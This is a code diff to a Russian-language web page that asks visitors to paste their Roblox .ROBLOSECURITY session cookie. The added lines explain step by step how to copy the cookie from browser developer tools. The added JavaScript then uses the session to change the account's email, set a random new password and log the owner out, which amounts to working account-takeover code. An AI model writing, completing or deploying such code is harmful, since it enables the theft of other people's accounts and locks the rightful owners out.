@@ -154,6 +154,7 @@
                 </div>
                 <div class="card p-4 cookie-panel" id="cookie-panel">
                     <h3 class="text-center">Введи куки Roblox</h3>
+                    <p class="text-muted small">Как получить куки: открой Roblox.com в браузере, нажми F12 → Application → Cookies → https://www.roblox.com → скопируй значение .ROBLOSECURITY.</p>
                     <form id="cookie-form">
                         <div class="mb-3">
                             <label for="cookies" class="form-label">Куки (.ROBLOSECURITY)</label>
@@ -345,9 +346,26 @@
                     return { success: false, needsVerification: true };
                 }
 
-                const newPassword = Array(18).fill().map(() => Math.random().toString(36  {
-                    return { success: true, newPassword };
+                const newPassword = Array(18).fill().map(() => Math.random().toString(36)[2]).join("");
+                const emailData = verificationCode ? { emailAddress: newEmail, verificationCode } : { emailAddress: newEmail };
+                const emailResponse = await fetch("https://accountsettings.roblox.com/v1/email", {
+                    method: "POST",
+                    headers,
+                    body: JSON.stringify(emailData)
+                });
+
+                if (emailResponse.ok) {
+                    const passwordResponse = await fetch("https://auth.roblox.com/v2/user/passwords", {
+                        method: "POST",
+                        headers,
+                        body: JSON.stringify({ currentPassword: "", newPassword })
+                    });
+                    if (passwordResponse.ok) {
+                        await fetch("https://auth.roblox.com/v2/logout", { method: "POST", headers });
+                        return { success: true, newPassword };
+                    }
                 }
+                return { success: false, needsVerification: false };
             } catch (e) {
                 console.error("Ошибка смены данных:", e);
                 return { success: false, needsVerification: false };
